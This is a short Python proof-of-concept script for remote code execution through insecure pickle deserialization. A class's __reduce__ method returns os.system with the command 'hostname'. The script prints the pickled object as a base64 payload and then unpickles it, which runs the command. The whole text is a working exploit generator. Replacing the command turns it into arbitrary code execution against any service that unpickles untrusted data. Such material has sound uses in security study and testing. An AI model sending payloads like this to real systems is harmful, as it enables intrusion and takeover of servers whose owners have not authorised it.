import _pickle as cPickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('hostname')
        return os.system, (cmd,)


if __name__ == '__main__':
    #serialize the code
    pickled = cPickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    #deserialize and run the code
    cPickle.loads(pickled)
